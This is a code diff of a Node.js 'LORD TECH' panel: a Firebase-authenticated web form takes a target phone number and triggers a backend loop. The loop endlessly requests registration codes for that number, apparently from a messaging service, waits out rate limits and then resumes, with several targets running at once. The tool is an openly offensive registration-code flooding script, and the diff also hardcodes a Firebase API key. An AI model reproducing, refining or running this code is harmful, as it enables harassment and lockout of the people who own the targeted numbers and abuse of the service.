@@ -29,18 +29,20 @@ const dashboardHTML = `
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LORD TECH | Executive Operations Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>LORD TECH - Command Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --bg-color: #0b0f19;
-            --card-bg: rgba(18, 26, 43, 0.75);
-            --border-color: rgba(255, 255, 255, 0.1);
-            --accent-blue: #00f2fe;
-            --accent-gradient: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+            --card-bg: rgba(23, 31, 51, 0.6);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --primary: #4f46e5;
+            --primary-hover: #4338ca;
+            --accent: #06b6d4;
             --text-main: #f3f4f6;
-            --text-sub: #9ca3af;
+            --text-muted: #9ca3af;
+            --error: #ef4444;
+            --success: #10b981;
         }
 
         * {
@@ -53,409 +55,351 @@ const dashboardHTML = `
         body {
             background-color: var(--bg-color);
             background-image: 
-                radial-gradient(circle at 15% 15%, rgba(0, 242, 254, 0.08) 0%, transparent 40%),
-                radial-gradient(circle at 85% 85%, rgba(79, 172, 254, 0.08) 0%, transparent 40%);
+                radial-gradient(at 0% 0%, rgba(79, 70, 229, 0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.15) 0px, transparent 50%);
             color: var(--text-main);
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            border-bottom: 1px solid var(--border-color);
+            background: rgba(11, 15, 25, 0.8);
+            backdrop-filter: blur(12px);
+        }
+
+        .brand {
+            font-size: 1.25rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            background: linear-gradient(135deg, #818cf8 0%, #06b6d4 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .creator-tag {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+        }
+
+        .main-container {
+            flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
 
-        .wrapper {
-            width: 100%;
-            max-width: 900px;
-        }
-
-        .auth-container, .dashboard-container {
+        .card {
             background: var(--card-bg);
             backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
             border: 1px solid var(--border-color);
             border-radius: 16px;
-            padding: 40px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            padding: 36px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
+        .tabs {
+            display: flex;
+            margin-bottom: 24px;
+            border-bottom: 1px solid var(--border-color);
         }
 
-        .header h1 {
-            font-size: 28px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            background: var(--accent-gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .tab-btn {
+            flex: 1;
+            padding: 10px;
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-bottom: 2px solid transparent;
         }
 
-        .header p {
-            color: var(--text-sub);
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
-        .creator-tag {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: var(--accent-blue);
-            margin-bottom: 8px;
-            font-weight: 600;
+        .tab-btn.active {
+            color: var(--text-main);
+            border-bottom-color: var(--accent);
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
-        .form-group label {
+        label {
             display: block;
-            font-size: 12px;
-            color: var(--text-sub);
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            font-weight: 500;
         }
 
         input {
             width: 100%;
-            padding: 14px 16px;
-            background: rgba(255, 255, 255, 0.04);
+            padding: 12px 16px;
+            background: rgba(15, 23, 42, 0.6);
             border: 1px solid var(--border-color);
             border-radius: 8px;
-            color: #fff;
-            font-size: 14px;
+            color: var(--text-main);
+            font-size: 0.95rem;
             outline: none;
-            transition: all 0.3s ease;
+            transition: border-color 0.2s ease;
         }
 
         input:focus {
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 10px rgba(0, 242, 254, 0.2);
+            border-color: var(--accent);
         }
 
         .btn {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-hover) 100%);
+            color: #ffffff;
             border: none;
             border-radius: 8px;
-            background: var(--accent-gradient);
-            color: #000;
-            font-weight: 700;
+            font-size: 0.95rem;
+            font-weight: 600;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: opacity 0.2s ease, transform 0.1s ease;
+            margin-top: 10px;
         }
 
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 242, 254, 0.3);
+            opacity: 0.9;
         }
 
-        .auth-toggle {
-            text-align: center;
+        .btn:active {
+            transform: scale(0.99);
+        }
+
+        .btn-danger {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--error);
+            border: 1px solid rgba(239, 68, 68, 0.3);
             margin-top: 20px;
-            font-size: 13px;
-            color: var(--text-sub);
         }
 
-        .auth-toggle span {
-            color: var(--accent-blue);
-            cursor: pointer;
-            font-weight: 600;
+        .btn-danger:hover {
+            background: rgba(239, 68, 68, 0.3);
         }
 
-        /* Dashboard Top Bar */
-        .dash-nav {
+        #authStatus, #targetStatus {
+            margin-top: 16px;
+            font-size: 0.85rem;
+            text-align: center;
+            min-height: 20px;
+        }
+
+        .user-bar {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 15px;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
             border-bottom: 1px solid var(--border-color);
         }
 
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: var(--accent-gradient);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #000;
-            font-weight: bold;
-        }
-
-        .btn-logout {
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
-            padding: 8px 16px;
-            border-radius: 6px;
-            border: none;
-            cursor: pointer;
-            font-size: 12px;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-
-        @media (max-width: 768px) {
-            .grid { grid-template-columns: 1fr; }
-        }
-
-        .table-container {
-            margin-top: 25px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
+        .user-email {
+            font-size: 0.85rem;
+            color: var(--text-muted);
             overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
 
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            text-align: left;
-            font-size: 13px;
+        .hidden {
+            display: none !important;
         }
-
-        th, td {
-            padding: 12px 16px;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        th {
-            background: rgba(255, 255, 255, 0.02);
-            color: var(--text-sub);
-            font-weight: 600;
-        }
-
-        .status-badge {
-            display: inline-block;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: 600;
-            background: rgba(0, 255, 136, 0.1);
-            color: #00ff88;
-        }
-
-        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <!-- AUTHENTICATION CARD -->
-    <div id="authCard" class="auth-container">
-        <div class="header">
-            <div class="creator-tag">Creator Lord Tech</div>
-            <h1 id="authTitle">AUTHENTICATION</h1>
-            <p>Access the control system</p>
+    <header>
+        <div class="brand">LORD TECH PANEL</div>
+        <div class="creator-tag">Created by <strong>Lord Tech</strong></div>
+    </header>
+
+    <div class="main-container">
+        <!-- AUTH SECTION -->
+        <div id="authSection" class="card">
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchAuthMode('login')">Sign In</button>
+                <button class="tab-btn" onclick="switchAuthMode('register')">Register</button>
+            </div>
+
+            <form id="authForm">
+                <div class="form-group">
+                    <label for="authEmail">Email Address</label>
+                    <input type="email" id="authEmail" placeholder="name@domain.com" required>
+                </div>
+                <div class="form-group">
+                    <label for="authPassword">Password</label>
+                    <input type="password" id="authPassword" placeholder="••••••••" required>
+                </div>
+                <button type="submit" id="authSubmitBtn" class="btn">Sign In</button>
+            </form>
+            <div id="authStatus"></div>
         </div>
-        <form id="authForm">
-            <div class="form-group">
-                <label>Email Address</label>
-                <input type="email" id="authEmail" placeholder="admin@lordtech.com" required>
+
+        <!-- DASHBOARD SECTION -->
+        <div id="dashboardSection" class="card hidden">
+            <div class="user-bar">
+                <span class="user-email" id="currentUserDisplay">User</span>
+                <span style="font-size: 0.75rem; background: rgba(16, 185, 129, 0.15); color: var(--success); padding: 4px 8px; border-radius: 4px;">Authenticated</span>
             </div>
-            <div class="form-group">
-                <label>Password</label>
-                <input type="password" id="authPassword" placeholder="••••••••" required>
-            </div>
-            <button type="submit" id="authBtn" class="btn">Sign In</button>
-        </form>
-        <div class="auth-toggle">
-            <span id="toggleText">Need an account? Sign Up</span>
+
+            <form id="targetForm">
+                <div class="form-group">
+                    <label for="ddi">Country Code</label>
+                    <input type="text" id="ddi" placeholder="e.g. 92" required>
+                </div>
+                <div class="form-group">
+                    <label for="number">Target Phone Number</label>
+                    <input type="text" id="number" placeholder="e.g. 3001234567" required>
+                </div>
+                <button type="submit" class="btn">Deploy Target</button>
+            </form>
+
+            <button id="logoutBtn" class="btn btn-danger">Sign Out</button>
+            <div id="targetStatus"></div>
         </div>
     </div>
 
-    <!-- MAIN DASHBOARD CARD -->
-    <div id="dashCard" class="dashboard-container hidden">
-        <div class="dash-nav">
-            <div class="user-info">
-                <div class="avatar" id="userAvatar">U</div>
-                <div>
-                    <div style="font-weight: 600; font-size: 14px;" id="userEmail">user@domain.com</div>
-                    <div style="font-size: 11px; color: var(--accent-blue);">Creator Lord Tech Platform</div>
-                </div>
-            </div>
-            <button class="btn-logout" id="logoutBtn"><i class="fa-solid font-awesome"></i> Log Out</button>
-        </div>
+    <!-- Firebase Modular SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { 
+            getAuth, 
+            createUserWithEmailAndPassword, 
+            signInWithEmailAndPassword, 
+            signOut, 
+            onAuthStateChanged 
+        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+        import { 
+            getDatabase, ref, push 
+        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        <div class="grid">
-            <div>
-                <h3 style="margin-bottom: 15px; font-size: 16px;">Deploy Target Number</h3>
-                <form id="targetForm">
-                    <div class="form-group">
-                        <label>Country Code</label>
-                        <input type="text" id="ddi" placeholder="92" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Phone Number</label>
-                        <input type="text" id="number" placeholder="3001234567" required>
-                    </div>
-                    <button type="submit" class="btn">Start Task</button>
-                </form>
-            </div>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCnLPPrYUgadNSpvCtOpY5-hxR-Oj9VRR4",
+            authDomain: "botttt-90f17.firebaseapp.com",
+            databaseURL: "https://botttt-90f17-default-rtdb.firebaseio.com",
+            projectId: "botttt-90f17",
+            storageBucket: "botttt-90f17.firebasestorage.app",
+            messagingSenderId: "81533093740",
+            appId: "1:81533093740:web:c538860b9245caa8d25549"
+        };
 
-            <div>
-                <h3 style="margin-bottom: 15px; font-size: 16px;">Active Tasks</h3>
-                <div class="table-container">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>Target</th>
-                                <th>Status</th>
-                            </tr>
-                        </thead>
-                        <tbody id="numberTable">
-                            <tr>
-                                <td colspan="2" style="text-align:center; color: var(--text-sub);">No active tasks running</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getDatabase(app);
 
-<!-- Firebase Modular SDK -->
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { 
-        getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, 
-        onAuthStateChanged, signOut 
-    } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-    import { 
-        getDatabase, ref, push, onValue 
-    } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        let currentUser = null;
+        let currentMode = 'login';
 
-    // Firebase Credentials Config
-    const firebaseConfig = {
-      apiKey: "AIzaSyCnLPPrYUgadNSpvCtOpY5-hxR-Oj9VRR4",
-      authDomain: "botttt-90f17.firebaseapp.com",
-      databaseURL: "https://botttt-90f17-default-rtdb.firebaseio.com",
-      projectId: "botttt-90f17",
-      storageBucket: "botttt-90f17.firebasestorage.app",
-      messagingSenderId: "81533093740",
-      appId: "1:81533093740:web:c538860b9245caa8d25549"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-    const db = getDatabase(app);
-
-    let currentUser = null;
-    let isSignUp = false;
-
-    // Toggle Sign In / Sign Up modes
-    document.getElementById('toggleText').addEventListener('click', () => {
-        isSignUp = !isSignUp;
-        document.getElementById('authTitle').innerText = isSignUp ? "CREATE ACCOUNT" : "AUTHENTICATION";
-        document.getElementById('authBtn').innerText = isSignUp ? "Sign Up" : "Sign In";
-        document.getElementById('toggleText').innerText = isSignUp ? "Already have an account? Sign In" : "Need an account? Sign Up";
-    });
-
-    // Auth Form Submit
-    document.getElementById('authForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const email = document.getElementById('authEmail').value;
-        const pass = document.getElementById('authPassword').value;
-
-        try {
-            if (isSignUp) {
-                await createUserWithEmailAndPassword(auth, email, pass);
-            } else {
-                await signInWithEmailAndPassword(auth, email, pass);
-            }
-        } catch (err) {
-            alert(err.message);
-        }
-    });
-
-    // Sign Out
-    document.getElementById('logoutBtn').addEventListener('click', () => signOut(auth));
-
-    // Auth State Tracking
-    onAuthStateChanged(auth, (user) => {
-        currentUser = user;
-        if (user) {
-            document.getElementById('authCard').classList.add('hidden');
-            document.getElementById('dashCard').classList.remove('hidden');
-            document.getElementById('userEmail').innerText = user.email;
-            document.getElementById('userAvatar').innerText = user.email[0].toUpperCase();
+        window.switchAuthMode = (mode) => {
+            currentMode = mode;
+            const tabs = document.querySelectorAll('.tab-btn');
+            const submitBtn = document.getElementById('authSubmitBtn');
             
-            // Listen for user targets in Firebase Realtime Database
-            const userTargetsRef = ref(db, 'users/' + user.uid + '/targets');
-            onValue(userTargetsRef, (snapshot) => {
-                const data = snapshot.val();
-                const tbody = document.getElementById('numberTable');
-                tbody.innerHTML = '';
+            tabs[0].classList.toggle('active', mode === 'login');
+            tabs[1].classList.toggle('active', mode === 'register');
+            submitBtn.textContent = mode === 'login' ? 'Sign In' : 'Create Account';
+            document.getElementById('authStatus').textContent = '';
+        };
 
-                if (data) {
-                    Object.values(data).forEach(item => {
-                        const tr = document.createElement('tr');
-                        tr.innerHTML = \`
-                            <td>+\${item.ddi}\${item.number}</td>
-                            <td><span class="status-badge">ACTIVE</span></td>
-                        \`;
-                        tbody.appendChild(tr);
-                    });
-                } else {
-                    tbody.innerHTML = '<tr><td colspan="2" style="text-align:center; color: var(--text-sub);">No active tasks running</td></tr>';
-                }
-            });
+        onAuthStateChanged(auth, (user) => {
+            currentUser = user;
+            const authSec = document.getElementById('authSection');
+            const dashSec = document.getElementById('dashboardSection');
+            const userDisplay = document.getElementById('currentUserDisplay');
 
-        } else {
-            document.getElementById('authCard').classList.remove('hidden');
-            document.getElementById('dashCard').classList.add('hidden');
-        }
-    });
-
-    // Deployment Form Submit
-    document.getElementById('targetForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const ddi = document.getElementById('ddi').value.trim();
-        const number = document.getElementById('number').value.trim();
-
-        if (!currentUser) return;
-
-        // Save Target to Firebase Realtime DB under User Node
-        const userTargetsRef = ref(db, 'users/' + currentUser.uid + '/targets');
-        await push(userTargetsRef, {
-            ddi: ddi,
-            number: number,
-            timestamp: Date.now()
+            if (user) {
+                userDisplay.textContent = user.email;
+                authSec.classList.add('hidden');
+                dashSec.classList.remove('hidden');
+            } else {
+                authSec.classList.remove('hidden');
+                dashSec.classList.add('hidden');
+            }
         });
 
-        // Trigger Node.js backend task
-        try {
-            await fetch('/start', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ddi, number, uid: currentUser.uid })
-            });
-            document.getElementById('ddi').value = '';
-            document.getElementById('number').value = '';
-        } catch (err) {
-            alert('Failed connecting to server endpoint.');
-        }
-    });
-</script>
+        document.getElementById('authForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('authEmail').value;
+            const password = document.getElementById('authPassword').value;
+            const statusDiv = document.getElementById('authStatus');
+
+            statusDiv.style.color = '#9ca3af';
+            statusDiv.textContent = 'Processing request...';
+
+            try {
+                if (currentMode === 'register') {
+                    await createUserWithEmailAndPassword(auth, email, password);
+                    statusDiv.style.color = '#10b981';
+                    statusDiv.textContent = 'Account created successfully!';
+                } else {
+                    await signInWithEmailAndPassword(auth, email, password);
+                    statusDiv.style.color = '#10b981';
+                    statusDiv.textContent = 'Authenticated. Redirecting...';
+                }
+            } catch (error) {
+                statusDiv.style.color = '#ef4444';
+                statusDiv.textContent = error.message.replace('Firebase: ', '');
+            }
+        });
+
+        document.getElementById('logoutBtn').addEventListener('click', () => {
+            signOut(auth);
+        });
+
+        document.getElementById('targetForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const ddi = document.getElementById('ddi').value.trim();
+            const number = document.getElementById('number').value.trim();
+            const statusDiv = document.getElementById('targetStatus');
+            
+            statusDiv.textContent = "Deploying target request...";
+            statusDiv.style.color = "#06b6d4";
+
+            if (currentUser) {
+                const userTargetsRef = ref(db, 'users/' + currentUser.uid + '/targets');
+                push(userTargetsRef, {
+                    ddi: ddi,
+                    number: number,
+                    timestamp: Date.now()
+                });
+            }
+
+            try {
+                const response = await fetch('/start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ddi, number })
+                });
+
+                const result = await response.json();
+                statusDiv.textContent = result.message;
+                statusDiv.style.color = "#10b981";
+                document.getElementById('ddi').value = '';
+                document.getElementById('number').value = '';
+            } catch (error) {
+                statusDiv.textContent = "Failed to communicate with backend.";
+                statusDiv.style.color = "#ef4444";
+            }
+        });
+    </script>
 </body>
 </html>
 `;
@@ -471,7 +415,6 @@ const start = async () => {
     console.log(masterBanner);
     console.log(color('╔════════════════════════════════════════════╗', ['#00F2FE', '#4FACFE']));
     console.log(color('║       👑 CREATOR: LORD TECH 👑              ║', ['#FFFFFF', '#00F2FE']));
-    console.log(color('║       🛡️ SYSTEM  : EXECUTIVE DASHBOARD      ║', ['#00FFFF', '#0000FF']));
     console.log(color('╚════════════════════════════════════════════╝', ['#00F2FE', '#4FACFE']));
 
     const { state } = await useMultiFileAuthState('.auth_session');
@@ -484,6 +427,8 @@ const start = async () => {
 
     const dropNumber = async (context) => {
         const { ddi, number, phoneNumber } = context;
+        console.log(color(`\n[+] TARGET LAUNCHED: +${phoneNumber} | CREATOR: LORD TECH`, ['#00FF00', '#FFFFFF']));
+
         while (true) {
             try {
                 const res = await spam.requestRegistrationCode({
@@ -493,17 +438,20 @@ const start = async () => {
                     phoneNumberMobileCountryCode: 724
                 });
 
+                console.log(color(`[>] REQUEST SENT -> +${phoneNumber}`, ['#00F2FE', '#FFFFFF']));
+
                 if (res.reason === 'temporarily_unavailable') {
                     console.log(color(`[!] LIMIT REACHED (+${phoneNumber})! RETRY IN: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                     await new Promise(r => setTimeout(r, res.retry_after * 1000));
                 }
             } catch (e) {
-                await new Promise(r => setTimeout(r, 2000));
+                console.log(color(`[!] RETRYING (+${phoneNumber})...`, ['#FFA500', '#FF0000']));
+                await new Promise(r => setTimeout(r, 3000));
             }
         }
     };
 
-    // HTTP Server handling frontend and multi-target launches
+    // Node.js HTTP Server
     const server = http.createServer((req, res) => {
         if (req.method === 'GET' && req.url === '/') {
             res.writeHead(200, { 'Content-Type': 'text/html' });
@@ -514,7 +462,6 @@ const start = async () => {
             req.on('end', () => {
                 const data = JSON.parse(body);
                 
-                // Spawn target loop independently so multiple numbers run concurrently
                 dropNumber({ 
                     ddi: data.ddi, 
                     number: data.number, 
@@ -522,7 +469,7 @@ const start = async () => {
                 });
                 
                 res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ message: `Target +${data.ddi}${data.number} initiated.` }));
+                res.end(JSON.stringify({ message: `Target +${data.ddi}${data.number} engaged. Check Termux terminal.` }));
             });
         } else {
             res.writeHead(404);
@@ -531,7 +478,7 @@ const start = async () => {
     });
 
     server.listen(3000, () => {
-        console.log(color('\n ► LORD TECH CONTROL PANEL ACTIVE: http://localhost:3000', ['#00FF00', '#FFFFFF']));
+        console.log(color('\n ► LORD TECH PANEL RUNNING: http://localhost:3000', ['#00FF00', '#FFFFFF']));
     });
 };
 
